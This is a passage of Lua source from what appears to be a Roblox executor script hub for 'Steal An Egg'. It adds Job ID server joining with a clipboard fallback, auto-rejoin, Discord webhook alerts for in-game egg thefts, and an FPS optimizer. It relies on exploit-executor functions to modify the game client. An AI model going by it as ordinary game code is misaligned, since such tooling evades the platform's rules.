			end)
		end,
	})
end

do
	local n13 = 8
	local n14 = 0
	local str = ""
	local v13 = nil

	local function fn16()
		return os.clock() < n14
	end

	local function fn17(arg)
		n14 = arg and os.clock() + n13 or 0
	end

	local function fn18(arg)
		local match = tostring(arg or ""):match("^%s*(.-)%s*$")
		return match:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or match
	end

	local function fn19()
		local v14 = str
		local result = str

		if v13 then
			local ok

			ok, result = pcall(function()
				local controller = v13._controller
				return controller and controller.GetValue and controller.GetValue()
			end)

			if not (ok and type(result) == "string" and result ~= "") then
				local exitTo = nil

				for _, v15 in ipairs({ "Get", "GetValue", "GetText" }) do
					local ok2, result2 = pcall(function()
						return v13[v15]
					end)

					if ok2 and type(result2) == "function" then
						local ok3
						ok3, result = pcall(result2, v13)
						if ok3 and type(result) == "string" and result ~= "" then
							exitTo = 1
							break
						end
					end
				end

				if exitTo ~= 1 then
					result = v14
				end
			end
		end

		local v15 = fn18(result)

		if v15 == "" then
			local ok, result2 = pcall(function()
				local v16 = getclipboard or readclipboard or getrbxclipboard
				return type(v16) == "function" and v16() or nil
			end)

			if ok and type(result2) == "string" then
				v15 = fn18(result2)
			end
		end

		return v15
	end

	local function fn20(arg)
		if not v13 then
			return
		end

		pcall(function()
			local controller = v13._controller

			if controller and controller.SetValue then
				controller.SetValue(arg, false)
			end
		end)

		str = fn18(arg)
	end

	local function fn21(arg)
		fn17(true)
		pcall(AutoLoadBeforeTeleport)

		if not pcall(function()
			if game.JobId ~= "" then
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			else
				TeleportService:Teleport(game.PlaceId, localPlayer)
			end
		end) then
			fn17(false)
			fn15(arg, "Roblox could not rejoin the server.")
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
			if not fn16() then
				return
			end
			fn17(false)
			fn15("Teleport Failed", tostring(arg3 ~= "" and arg3 or arg2))
		end)
	end)

	v13 = v12:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(arg)
			str = fn18(arg)
		end,
	})

	if v13 then
		v13._configIgnored = true

		if v13.State and not v13.State._registered then
			v13.State._configIgnored = true
		end
	end

	v12:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			if fn16() then
				fn15("Join Job ID Failed", "A teleport is already running, try again shortly.")
				return
			end
			local v14 = fn19()
			if v14 == "" then
				fn15("Join Job ID Failed", "Paste a valid Job ID first.")
				return
			end
			fn17(true)
			pcall(AutoLoadBeforeTeleport)

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, v14, localPlayer)
			end) then
				fn17(false)
				fn15("Join Job ID Failed", "Roblox could not join that server.")
			end
		end,
	})

	v12:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local str2 = tostring(game.JobId or "")
			fn20(str2)
			local v14 = setclipboard or toclipboard
			fn15((type(v14) == "function" and pcall(v14, str2) or false) and "Job ID Copied" or "Job ID Shown", str2)
		end,
	})

	v12:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if fn16() then
				fn15("Rejoin Failed", "A teleport is already running, try again shortly.")
				return
			end
			fn21("Rejoin Failed")
		end,
	})

	local tbl17 = { Option = nil, Fired = false, TeleportingAt = 0 }

	local function fn22()
		local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
		robloxPromptGui = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
		return robloxPromptGui ~= nil and robloxPromptGui:FindFirstChild("ErrorPrompt") ~= nil
	end

	pcall(function()
		local connection = localPlayer.OnTeleport:Connect(function(arg)
			if arg == Enum.TeleportState.Failed then
				tbl17.TeleportingAt = 0
			else
				tbl17.TeleportingAt = os.clock()
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	tbl17.Option = v12:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })

	local function fn23(arg)
		if tbl17.Fired or tbl17.Option == nil or not tbl4.Toggle(tbl17.Option, false) or fn16() then
			return
		end
		local flag2 = tbl17.TeleportingAt > 0

		if flag2 then
			local teleportingAt = tbl17.TeleportingAt
			flag2 = os.clock() - teleportingAt < 60
		end

		if flag2 then
			return
		end
		local v14 = string.lower(tostring(arg or ""))
		if v14 == "" or string.find(v14, "teleport", 1, true) then
			return
		end
		local errorCode = nil

		pcall(function()
			errorCode = GuiService:GetErrorCode()
		end)

		if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(v14, "banned", 1, true) or string.find(v14, "same account", 1, true) then
			return
		end
		tbl17.Fired = true
		local placeId = game.PlaceId
		local str2 = tostring(game.JobId or "")
		local flag3 = string.find(v14, "shut", 1, true) ~= nil or string.find(v14, "no longer", 1, true) ~= nil or string.find(v14, "closed", 1, true) ~= nil
		pcall(AutoLoadBeforeTeleport)
		fn15("Auto Rejoin", flag3 and "Server closed, joining another one." or "Disconnected, rejoining now.")

		task.spawn(function()
			local n15 = 0

			while true do
				n15 += 1
				local flag4 = not flag3 and str2 ~= "" and n15 <= 2

				pcall(function()
					if flag4 then
						TeleportService:TeleportToPlaceInstance(placeId, str2, localPlayer)
					else
						TeleportService:Teleport(placeId, localPlayer)
					end
				end)

				task.wait(flag4 and 4 or 5)
			end
		end)
	end

	pcall(function()
		local connection = GuiService.ErrorMessageChanged:Connect(function(arg)
			task.wait(0.3)

			if fn22() then
				fn23(arg)
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	task.spawn(function()
		local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
		robloxPromptGui = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
		if not robloxPromptGui then
			return
		end

		local connection = robloxPromptGui.ChildAdded:Connect(function(child)
			if child.Name ~= "ErrorPrompt" then
				return
			end
			task.wait(0.2)
			local str2 = ""

			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
					str2 = descendant.Text
				end
			end

			if str2 == "" then
				pcall(function()
					str2 = GuiService:GetErrorMessage()
				end)
			end

			fn23(str2 ~= "" and str2 or "disconnected")
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)
end

do
	local AssetService = game:GetService("AssetService")
	local request_ = syn and syn.request or http and http.request or http_request or request

	local tbl17 = {
		Url = "",
		Stolen = false,
		PingEveryone = false,
		Queue = {},
		Sending = false,
		Notified = {},
		Icons = {},
		Pngs = {},
		Crc = {},
		Known = nil,
		Carry = nil,
		Avatar = nil,
		Disposed = false,
		Path = "ChilliLibrary/SAE_Webhook.txt",
		Saved = "",
		LoadedAt = os.clock(),
		Input = nil,
		Dot = "  " .. utf8.char(183) .. "  ",
		MaxSide = 200,
		Logo = "https://media.discordapp.net/attachments/1181785068637790221/1551685385665380432/chilli.png?ex=6ab2df20&is=6ab18da0&hm=5ca4b16854493c689912c068c29354752a0f2ea0490d5b22cbd9acf7d26ed7eb&=&format=webp&quality=lossless",
		Emoji = {
			Value = "<:sae_value:1551645680718581871>",
			Size = "<:sae_size:1551645444285800558>",
			Mutation = "<:sae_mutation:1551677914146275478>",
			Area = "<:sae_area:1551675973328441416>",
		},
	}

	pcall(function()
		if type(readfile) ~= "function" then
			return
		end

		if type(isfile) == "function" and not isfile(tbl17.Path) then
			return
		end
		local v13 = string.gsub(tostring(readfile(tbl17.Path) or ""), "%s", "")
		tbl17.Saved = v13
		tbl17.Url = v13
	end)

	for i = 0, 255 do
		local v13 = i

		for i2 = 1, 8 do
			if bit32.band(v13, 1) == 1 then
				v13 = bit32.bxor(3988292384, bit32.rshift(v13, 1))
			else
				v13 = bit32.rshift(v13, 1)
			end
		end

		tbl17.Crc[i] = v13
	end

	local function fn16(arg)
		if type(arg) ~= "string" then
			return false
		end

		for _, v13 in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
			if string.match(arg, "^https://" .. v13 .. "/api/webhooks/%d+/[%w%-_]+$") then
				return true
			end
		end

		return false
	end

	local function fn17(arg)
		if type(request_) ~= "function" then
			return nil
		end
		local ok, result = pcall(request_, { Url = arg, Method = "GET" })
		if not ok or type(result) ~= "table" or tonumber(result.StatusCode) ~= 200 then
			return nil
		end
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body))
		return ok2 and result2 or nil
	end

	local function fn18(arg, arg2)
		local flag2 = type(arg) == "table" and type(arg.data) == "table" and arg.data[1] or nil
		if type(flag2) ~= "table" or flag2.state ~= "Completed" or type(flag2.imageUrl) ~= "string" or flag2.imageUrl == "" then
			return nil
		end

		if arg2 and not string.find(flag2.imageUrl, "/Image/", 1, true) then
			return nil
		end
		return flag2.imageUrl
	end

	local function fn19(arg)
		if tbl17.Icons[arg] == nil then
			tbl17.Icons[arg] = fn18(fn17("https://thumbnails.roblox.com/v1/assets?assetIds=" .. arg .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
		end

		return tbl17.Icons[arg] or nil
	end

	local function fn20()
		if tbl17.Avatar == nil then
			tbl17.Avatar = fn18(fn17("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
		end

		return tbl17.Avatar or nil
	end

	local function fn21(arg, arg2, arg3)
		local crc = tbl17.Crc
		local n13 = 4294967295

		for i = arg2, arg3 do
			local rshift = bit32.rshift
			n13 = bit32.bxor(crc[bit32.band(bit32.bxor(n13, buffer.readu8(arg, i)), 255)], rshift(n13, 8))
		end

		return bit32.bxor(n13, 4294967295)
	end

	local function fn22(arg, arg2, arg3)
		local n13 = arg2 * 4 + 1
		local n14 = n13 * arg3
		local n15 = 2 + math.ceil(n14 / 65535) * 5 + n14 + 4
		local v13 = buffer.create(45 + n15 + 12)
		local n16 = 0

		local function fn23(arg4)
			buffer.writeu8(v13, n16, arg4)
			n16 += 1
		end

		local function fn24(arg4)
			fn23(bit32.band(bit32.rshift(arg4, 24), 255))
			fn23(bit32.band(bit32.rshift(arg4, 16), 255))
			fn23(bit32.band(bit32.rshift(arg4, 8), 255))
			fn23(bit32.band(arg4, 255))
		end

		local function fn25(arg4, arg5, arg6, arg7)
			fn23(arg4)
			fn23(arg5)
			fn23(arg6)
			fn23(arg7)
		end

		for _, v14 in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
			fn23(v14)
		end

		fn24(13)
		fn25(73, 72, 68, 82)
		fn24(arg2)
		fn24(arg3)
		fn23(8)
		fn23(6)
		fn23(0)
		fn23(0)
		fn23(0)
		fn24(fn21(v13, n16, n16 - 1))
		local v14 = buffer.create(n14)

		for i = 0, arg3 - 1 do
			buffer.writeu8(v14, i * n13, 0)
			buffer.copy(v14, i * n13 + 1, arg, i * arg2 * 4, arg2 * 4)
		end

		fn24(n15)
		local v15 = n16
		fn25(73, 68, 65, 84)
		fn23(120)
		fn23(1)
		local n17 = 0

		while n17 < n14 do
			local n18 = math.min(65535, n14 - n17)
			fn23(n17 + n18 >= n14 and 1 or 0)
			fn23(bit32.band(n18, 255))
			fn23(bit32.rshift(n18, 8))
			local v16 = bit32.band(bit32.bnot(n18), 65535)
			fn23(bit32.band(v16, 255))
			fn23(bit32.rshift(v16, 8))
			buffer.copy(v13, n16, v14, n17, n18)
			n16 += n18
			n17 += n18
		end

		local n18 = 1
		local n19 = 0

		for i = 0, n14 - 1 do
			n18 = (n18 + buffer.readu8(v14, i)) % 65521
			n19 = (n19 + n18) % 65521
		end

		fn24(n19 * 65536 + n18)
		fn24(fn21(v13, v15, n16 - 1))
		fn24(0)
		fn25(73, 69, 78, 68)
		fn24(fn21(v13, n16, n16 - 1))
		return buffer.tostring(v13)
	end

	local function fn23(arg)
		if tbl17.Pngs[arg] ~= nil then
			return tbl17.Pngs[arg] or nil
		end

		local ok, result = pcall(function()
			local v13 = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. arg))
			local size = v13.Size
			local n13 = math.floor(size.X)
			local n14 = math.floor(size.Y)
			local v14 = v13:ReadPixelsBuffer(Vector2.zero, size)

			pcall(function()
				v13:Destroy()
			end)

			local n15 = math.min(1, tbl17.MaxSide / math.max(n13, n14))
			local n16 = math.max(1, math.floor(n13 * n15))
			local n17 = math.max(1, math.floor(n14 * n15))
			local v15 = buffer.create(n16 * n17 * 4)

			for i = 0, n17 - 1 do
				local n18 = math.min(n14 - 1, math.floor(i / n15))

				for i2 = 0, n16 - 1 do
					buffer.copy(v15, (i * n16 + i2) * 4, v14, (n18 * n13 + math.min(n13 - 1, math.floor(i2 / n15))) * 4, 4)
				end
			end

			return fn22(v15, n16, n17)
		end)

		tbl17.Pngs[arg] = ok and type(result) == "string" and result or false
		return tbl17.Pngs[arg] or nil
	end

	local function fn24(arg, arg2)
		if arg2 then
			return 13686498
		end

		if typeof(arg) ~= "Color3" then
			return 5793266
		end
		return math.floor(arg.R * 255 + 0.5) * 65536 + math.floor(arg.G * 255 + 0.5) * 256 + math.floor(arg.B * 255 + 0.5)
	end

	local function fn25(arg)
		local tbl18 = {}

		if type(arg) == "table" then
			for _, v13 in ipairs(arg) do
				tbl18[#tbl18 + 1] = fn7(v13)
			end
		end

		return #tbl18 > 0 and table.concat(tbl18, ", ") or "None"
	end

	local function fn26(arg)
		local areas = tbl.Areas
		local directory = type(areas) == "table" and (areas.Directory or areas) or nil
		local str = tostring(arg or "")
		local flag2 = type(directory) == "table" and str ~= "" and directory[str] or nil
		if type(flag2) == "table" then
			return tostring(flag2.DisplayName or str)
		end
		return str ~= "" and str or "Field"
	end

	local function fn27(arg, arg2, arg3, arg4, arg5, arg6)
		local str = tostring(arg2)
		local v13 = tbl12.AssetInfo(str)
		local n13 = tonumber(arg3) or 1
		arg4 = type(arg4) == "table" and arg4 or {}
		local v14 = tbl12.Income(v13, n13, arg4)
		local dot = tbl17.Dot
		local str2 = string.format("x%.2f", n13)
		local eggRecords = tbl.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
			local ok, result = pcall(eggRecords.WeightKgForScale, str, n13)

			if ok and tonumber(result) then
				str2 ..= dot .. tbl12.FormatWeight(result)
			end
		end

		local emoji = tbl17.Emoji
		local tbl18 = {}
		local str3 = "**" .. tostring(v13.Name) .. "**" .. dot .. tostring(v13.Rarity)
		local str4 = emoji.Value .. " **Value:** $" .. tbl12.FormatRate(v14)
		local str5 = emoji.Size .. " **Size:** " .. str2
		local str6 = emoji.Mutation .. " **Mutation:** " .. fn25(arg4)
		local str7 = emoji.Area .. " **Area:** " .. fn26(arg5)
		tbl18[1] = str3
		tbl18[2] = str4
		tbl18[3] = str5
		tbl18[4] = str6
		tbl18[5] = str7

		local tbl19 = {
			author = { name = localPlayer.DisplayName, icon_url = fn20() },
			title = arg,
			description = table.concat(tbl18, "\n"),
			color = fn24(v13.Color, string.upper(tostring(v13.Rarity)) == "SECRET"),
			footer = { text = "Chilli Hub" .. dot .. "Steal An Egg", icon_url = tbl17.Logo },
			timestamp = DateTime.now():ToIsoDate(),
		}

		local tbl20 = { username = "Chilli Hub", avatar_url = tbl17.Logo, embeds = { tbl19 } }
		local icon = v13.Icon
		local icon2

		if arg6 then
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag2 = type(directory) == "table" and directory[str] or nil
			local egg = type(flag2) == "table" and type(flag2.Egg) == "table" and flag2.Egg or nil

			if egg and egg.Icon ~= nil then
				icon2 = egg.Icon
			else
				icon2 = icon
			end
		else
			icon2 = icon
		end

		local num = tonumber(string.match(tostring(icon2 or ""), "(%d+)"))
		local v15 = num and fn23(num) or nil
		local flag2 = num and not v15 and fn19(num) or nil

		if v15 then
			tbl19.thumbnail = { url = "attachment://egg.png" }
			tbl20.attachments = { { id = 0, filename = "egg.png" } }
		elseif flag2 then
			tbl19.thumbnail = { url = flag2 }
		end

		return tbl20, v15
	end

	local function fn28()
		if tbl17.Sending then
			return
		end
		tbl17.Sending = true

		task.spawn(function()
			while #tbl17.Queue > 0 and not tbl17.Disposed do
				local v13 = table.remove(tbl17.Queue, 1)

				if fn16(tbl17.Url) and type(request_) == "function" then
					local tbl18 = { Url = tbl17.Url, Method = "POST" }

					if v13.Png then
						local str = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
						tbl18.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str }
						local concat = table.concat
						local tbl19 = {}
						local png = v13.Png
						local json = HttpService:JSONEncode(v13.Payload)
						tbl19[1] = "--"
						tbl19[2] = str
						tbl19[3] = "\r\n"
						tbl19[4] = "Content-Disposition: form-data; name=\"payload_json\"\r\n"
						tbl19[5] = "Content-Type: application/json\r\n\r\n"
						tbl19[6] = json
						tbl19[7] = "\r\n"
						tbl19[8] = "--"
						tbl19[9] = str
						tbl19[10] = "\r\n"
						tbl19[11] = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n"
						tbl19[12] = "Content-Type: image/png\r\n\r\n"
						tbl19[13] = png
						tbl19[14] = "\r\n"
						tbl19[15] = "--"
						tbl19[16] = str
						tbl19[17] = "--\r\n"
						tbl18.Body = concat(tbl19)
					else
						tbl18.Headers = { ["Content-Type"] = "application/json" }
						tbl18.Body = HttpService:JSONEncode(v13.Payload)
					end

					local ok, result = pcall(request_, tbl18)
					ok = ok and type(result) == "table" and tonumber(result.StatusCode) or nil

					if ok == 429 and v13.Tries < 3 then
						v13.Tries = v13.Tries + 1
						table.insert(tbl17.Queue, 1, v13)
						task.wait(3)
					elseif ok ~= 200 and ok ~= 204 and v13.Png then
						v13.Png = nil
						v13.Payload.attachments = nil
						local flag2 = type(v13.Payload.embeds) == "table" and v13.Payload.embeds[1] or nil

						if flag2 then
							flag2.thumbnail = nil
						end

						table.insert(tbl17.Queue, 1, v13)
					end
				end

				task.wait(1.2)
			end

			tbl17.Sending = false
		end)
	end

	local function fn29()
		return type(request_) == "function" and fn16(tbl17.Url)
	end

	local function fn30(arg, arg2)
		if #tbl17.Queue >= 20 then
			table.remove(tbl17.Queue, 1)
		end

		if tbl17.PingEveryone and type(arg) == "table" then
			arg.content = "@everyone"
			arg.allowed_mentions = { parse = { "everyone" } }
		end

		table.insert(tbl17.Queue, { Payload = arg, Png = arg2, Tries = 0 })
		fn28()
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			if type(arg) ~= "table" then
				return
			end

			if arg.IsCarrying then
				tbl17.Carry = {
					Category = tostring(arg.AssetCategory),
					Uid = tostring(arg.Uid),
					Area = tostring(arg.AreaId or "Field"),
					EndedAt = nil,
				}
			elseif tbl17.Carry then
				tbl17.Carry.EndedAt = os.clock()
			end
		end)

		if ok and result then
			fn4(function()
				pcall(function()
					result:Disconnect()
				end)
			end)
		end
	end

	fn4(function()
		tbl17.Disposed = true
	end)

	task.spawn(function()
		while not tbl17.Disposed do
			local flag2 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
			local flag3 = false
			local result = nil

			if flag2 then
				flag3, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			end

			if flag3 and type(result) == "table" then
				local known = tbl17.Known
				local tbl18 = {}
				local known2 = {}

				for k, v13 in pairs(result) do
					local str = tostring(k)
					known2[str] = true

					if known and not known[str] and type(v13) == "table" then
						tbl18[#tbl18 + 1] = { Uid = str, Record = v13 }
					end
				end

				tbl17.Known = known2
				local carry = tbl17.Carry

				if tbl17.Stolen and carry and #tbl18 > 0 then
					for _, v13 in ipairs(tbl18) do
						local record = v13.Record
						local flag4 = carry.EndedAt == nil

						if not flag4 then
							local endedAt = carry.EndedAt
							flag4 = os.clock() - endedAt < 20
						end

						if flag4 then
							flag4 = v13.Uid == carry.Uid

							if not flag4 then
								local category = carry.Category
								flag4 = tostring(record.AssetCategory) == category
							end
						end

						if flag4 then
							tbl17.Carry = nil
							local mutations = type(record.Mutations) == "table" and record.Mutations or {}

							task.spawn(function()
								if fn29() then
									fn30(fn27("Egg Stolen!", record.AssetCategory, record.AssetScale, mutations, carry.Area))
								end
							end)

							break
						end
					end
				end
			end

			task.wait(1.5)
		end
	end)

	local function fn31(arg)
		local input = tbl17.Input
		if type(input) ~= "table" then
			return
		end

		for _, v13 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return input[v13]
			end)

			if ok and type(result) == "function" and pcall(result, input, arg, false) then
				return
			end
		end
	end

	tbl17.Input = v7:CreateInput({
		Name = "Webhook URL",
		Placeholder = "https://discord.com/api/webhooks/...",
		Default = tbl17.Saved,
		MaxLength = 256,
		Callback = function(arg)
			local v13 = string.gsub(tostring(arg or ""), "%s", "")
			local flag2 = v13 == "" and tbl17.Saved ~= ""

			if flag2 then
				local loadedAt = tbl17.LoadedAt
				flag2 = os.clock() - loadedAt < 5
			end

			if flag2 then
				tbl17.Url = tbl17.Saved
				task.defer(fn31, tbl17.Saved)
				return
			end

			tbl17.Url = v13

			if (v13 == "" or fn16(v13)) and v13 ~= tbl17.Saved and type(writefile) == "function" then
				if pcall(writefile, tbl17.Path, v13) then
					tbl17.Saved = v13
				end
			end
		end,
	})

	v7:CreateToggle({
		Name = "Ping @everyone",
		Default = false,
		Callback = function(arg)
			tbl17.PingEveryone = arg == true
		end,
	})

	v7:CreateToggle({
		Name = "Notify Stolen Eggs",
		Note = "Post every egg you bring home",
		Default = false,
		Callback = function(arg)
			tbl17.Stolen = arg == true
		end,
	})
end

local v13
v13 = v2:CreateTab({ Name = "Misc", SectionsExpanded = true })
local v14
v14 = v13:CreateSection({ Name = "Performance", Expanded = true })
local flag2 = false

v14:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Callback = function(arg)
		local n13 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)
		if type(setfpscap) == "function" and pcall(setfpscap, n13) then
			flag2 = false
			return
		end

		if not flag2 then
			flag2 = true
			fn15("FPS Cap Unavailable", "This environment does not support setfpscap.")
		end
	end,
})

do
	local Lighting = game:GetService("Lighting")
	local n13 = 0.003
	local flag3 = false
	local n14 = 0
	local thread = nil
	local tbl17 = {}
	local tbl18 = {}
	local obj = setmetatable({}, { __mode = "k" })
	local tbl19 = {}
	local connection = nil

	local function fn16(arg, arg2, arg3)
		local ok, result = pcall(arg)
		if not ok then
			return
		end
		tbl18[#tbl18 + 1] = { Setter = arg2, Value = result }
		pcall(arg2, arg3)
	end

	local function fn17(arg, arg2, arg3)
		local v15 = obj[arg]

		if not v15 then
			local tbl20 = {}
			obj[arg] = tbl20
			v15 = tbl20
		end

		if v15[arg2] == nil then
			local ok, result = pcall(function()
				return arg[arg2]
			end)

			if not ok then
				return
			end
			v15[arg2] = { Value = result }
		end

		pcall(function()
			arg[arg2] = arg3
		end)
	end

	local function fn18(arg)
		if not flag3 or not arg.Parent then
			return
		end

		if arg:IsA("ParticleEmitter") then
			fn17(arg, "Enabled", false)
			fn17(arg, "Rate", 0)
		elseif arg:IsA("Trail") or arg:IsA("Beam") then
			fn17(arg, "Enabled", false)
		elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
			fn17(arg, "Enabled", false)
			fn17(arg, "Brightness", 0)
		elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
			fn17(arg, "Enabled", false)
		elseif arg:IsA("Explosion") then
			fn17(arg, "Visible", false)
		elseif arg:IsA("SpecialMesh") then
			fn17(arg, "TextureId", "")
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
				fn17(arg, "Transparency", 1)
			end
		elseif arg:IsA("MeshPart") then
			fn17(arg, "RenderFidelity", Enum.RenderFidelity.Performance)
			fn17(arg, "TextureID", "")
			fn17(arg, "CastShadow", false)
			fn17(arg, "Reflectance", 0)
			fn17(arg, "Material", Enum.Material.SmoothPlastic)
		elseif arg:IsA("BasePart") then
			fn17(arg, "CastShadow", false)
			fn17(arg, "Reflectance", 0)
			fn17(arg, "Material", Enum.Material.SmoothPlastic)
		elseif arg:IsA("PostEffect") then
			fn17(arg, "Enabled", false)
		elseif arg:IsA("Clouds") then
			fn17(arg, "Cover", 0)
			fn17(arg, "Density", 0)
		elseif arg:IsA("Atmosphere") then
			fn17(arg, "Density", 0)
			fn17(arg, "Haze", 0)
			fn17(arg, "Glare", 0)
		end
	end

	local function fn19()
		for _, v15 in ipairs(tbl17) do
			if v15.Connected then
				v15:Disconnect()
			end
		end

		table.clear(tbl17)

		if connection then
			pcall(function()
				connection:Disconnect()
			end)

			connection = nil
		end
	end

	local function fn20()
		local rendering = settings().Rendering
		local terrain = workspace.Terrain

		local function fn21(arg, arg2, arg3)
			local function fn22()
				return arg[arg2]
			end

			local function fn23(arg4)
				arg[arg2] = arg4
			end

			local v15 = arg3
			fn16(fn22, fn23, v15)
		end

		fn21(rendering, "QualityLevel", Enum.QualityLevel.Level01)
		fn21(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
		fn21(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)

		local ok, result = pcall(function()
			return UserSettings():GetService("UserGameSettings")
		end)

		if ok and result then
			fn21(result, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
		end

		fn21(Lighting, "GlobalShadows", false)
		fn21(Lighting, "ShadowSoftness", 0)
		fn21(Lighting, "FogEnd", 9e9)
		fn21(Lighting, "Technology", Enum.Technology.Legacy)
		fn21(Lighting, "EnvironmentDiffuseScale", 0)
		fn21(Lighting, "EnvironmentSpecularScale", 0)
		fn21(terrain, "Decoration", false)
		fn21(terrain, "WaterWaveSize", 0)
		fn21(terrain, "WaterWaveSpeed", 0)
		fn21(terrain, "WaterReflectance", 0)
		fn21(terrain, "WaterTransparency", 1)
	end

	local function fn21(arg, arg2)
		local now = os.clock()

		for _, descendant in ipairs(arg:GetDescendants()) do
			if not flag3 or n14 ~= arg2 then
				return false
			end
			fn18(descendant)

			if n13 < os.clock() - now then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end

		return true
	end

	local function fn22()
		if not flag3 or #tbl19 == 0 then
			return
		end
		local now = os.clock()

		while #tbl19 > 0 do
			local v15 = table.remove(tbl19)
			fn18(v15)
			if not (n13 < os.clock() - now) then
				continue
			end
			break
		end
	end

	local function fn23()
		local now = os.clock()

		for k, v15 in pairs(obj) do
			if k.Parent then
				for k2, v16 in pairs(v15) do
					pcall(function()
						k[k2] = v16.Value
					end)
				end
			end

			obj[k] = nil

			if n13 < os.clock() - now then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end
	end

	local function fn24()
		if not flag3 then
			return
		end
		flag3 = false
		n14 += 1
		fn19()
		table.clear(tbl19)

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		fn23()

		for i = #tbl18, 1, -1 do
			local v15 = tbl18[i]
			pcall(v15.Setter, v15.Value)
		end

		table.clear(tbl18)
	end

	local function fn25()
		if flag3 then
			return
		end
		flag3 = true
		n14 += 1
		local v15 = n14
		fn20()

		local function fn26(arg)
			tbl17[#tbl17 + 1] = arg.DescendantAdded:Connect(function(descendant)
				if flag3 and n14 == v15 then
					tbl19[#tbl19 + 1] = descendant
				end
			end)
		end

		fn26(workspace)
		fn26(Lighting)

		connection = RunService.Heartbeat:Connect(function()
			if flag3 and n14 == v15 then
				fn22()
			end
		end)

		thread = task.spawn(function()
			if fn21(workspace, v15) then
				fn21(Lighting, v15)
			end
		end)
	end

	fn4(fn24)

	v14:CreateToggle({
		Name = "Optimizer",
		Note = "Strip shadows, textures and effects for the highest FPS",
		Default = false,
		Callback = function(arg)
			if arg then
				fn25()
			else
				task.spawn(fn24)
			end
		end,
	})
end

do
	local Stats = game:GetService("Stats")
	local n13 = 132
	local n14 = 0.085
	local n15 = 0.2
	local n16 = 8
	local v15 = v2:CreateState({ Name = "FPS and Ping Position", Default = {} })

	local function fn16()
		local v16 = v15:Get()
		if type(v16) == "table" and type(v16.XOffset) == "number" and type(v16.YOffset) == "number" then
			return UDim2.new(tonumber(v16.XScale) or 0, v16.XOffset, tonumber(v16.YScale) or 0, v16.YOffset)
		end
		return UDim2.new(0, 16, 0, 16)
	end

	local function fn17(arg)
		v15:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
	end

	local color3 = Color3.fromRGB(58, 255, 55)
	local color4 = Color3.fromRGB(255, 214, 84)
	local color5 = Color3.fromRGB(255, 96, 96)
	local color6 = Color3.fromRGB(150, 150, 158)
	local flag3 = false
	local tbl17 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil
	local v16 = nil
	local v17 = nil
	local n17 = 1
	local n18 = 0
	local n19 = 0
	local v18 = nil
	local v19 = nil
	local font = nil

	pcall(function()
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function fn18(arg)
		if arg >= 100 then
			return color3
		end

		if arg >= 50 then
			return color4
		end
		return color5
	end

	local function fn19(arg)
		if arg <= 90 then
			return color3
		end

		if arg <= 180 then
			return color4
		end
		return color5
	end

	local function fn20()
		if not uiScale then
			return
		end
